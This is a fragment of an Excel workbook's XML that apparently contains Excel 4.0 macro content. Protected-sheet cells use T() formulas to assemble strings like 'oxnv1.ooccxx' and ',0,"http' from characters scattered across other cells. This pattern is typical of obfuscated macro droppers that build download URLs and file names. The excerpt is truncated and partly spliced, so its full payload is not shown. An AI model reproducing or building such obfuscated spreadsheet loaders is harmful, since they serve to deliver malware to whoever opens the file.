        <f>T(Sheet1!R17&amp;Sheet1!E14&amp;Sheet1!B11&amp;Sheet1!B3&amp;Sheet1!F14&amp;Sheet1!H28&amp;Sheet1!R17&amp;Sheet1!R17&amp;Sheet1!P15&amp;Sheet1!P15&amp;Sheet1!E14&amp;Sheet1!E14)</f>
        <v>oxnv3.ooccxx</v>
      </c>
    </row>
    <row r="9" spans="5:12" x14ac:dyDescent="0.25">
      <c r="E9" s="1" t="str">
        <f>T(Sheet1!R17&amp;Sheet1!E14&amp;Sheet1!B11&amp;Sheet1!B3&amp;Sheet1!Q4&amp;Sheet1!H28&amp;Sheet1!R17&amp;Sheet1!R17&amp;Sheet1!P15&amp;Sheet1!P15&amp;Sheet1!E14&amp;Sheet1!E14)</f>
        <v>oxnv1.ooccxx</v>
      </c>
    </row>
    <row r="12" spans="5:12" x14ac:dyDescent="0.25">
      <c r="L12" s="1" t="str">
        <f>T(Sheet1!R17&amp;Sheet1!E14&amp;Sheet1!B11&amp;Sheet1!B3&amp;Sheet1!H11&amp;Sheet1!H28&amp;Sheet1!R17&amp;Sheet1!R17&amp;Sheet1!P15&amp;Sheet1!P15&amp;Sheet1!E14&amp;Sheet1!E14)</f>
        <v>oxnv4.ooccxx</v>
      </c>
    </row>
    <row r="15" spans="5:12" x14ac:dyDescent="0.25">
      <c r="G15" s="1" t="str">
        <f>T(Sheet1!R17&amp;Sheet1!E14&amp;Sheet1!B11&amp;Sheet1!B3&amp;Sheet1!S5&amp;Sheet1!H28&amp;Sheet1!R17&amp;Sheet1!R17&amp;Sheet1!P15&amp;Sheet1!P15&amp;Sheet1!E14&amp;Sheet1!E14)</f>
        <v>oxnv2.ooccxx</v>
      </c>
    </row>
    <row r="21" spans="17:17" x14ac:dyDescent="0.25">
      <c r="Q21" s="1" t="str">
        <f>T(Sheet1!F26&amp;Sheet1!O11&amp;Sheet1!F26&amp;Sheet1!F24&amp;Sheet1!I15&amp;Sheet1!P8&amp;Sheet1!P8&amp;Sheet1!G17)</f>
        <v>,0,"http</v>
      </c>
    </row>
  </sheetData>
  <sheetProtection password="CC4D" sheet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Макросы Excel 4.0</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="7" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr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Gydar</dc:creator>
  <cp:lastModifiedBy>Gydar</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:19:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-11-07T12:22:36Z</dcterms:modified>
</cp:coreProperties>
</file>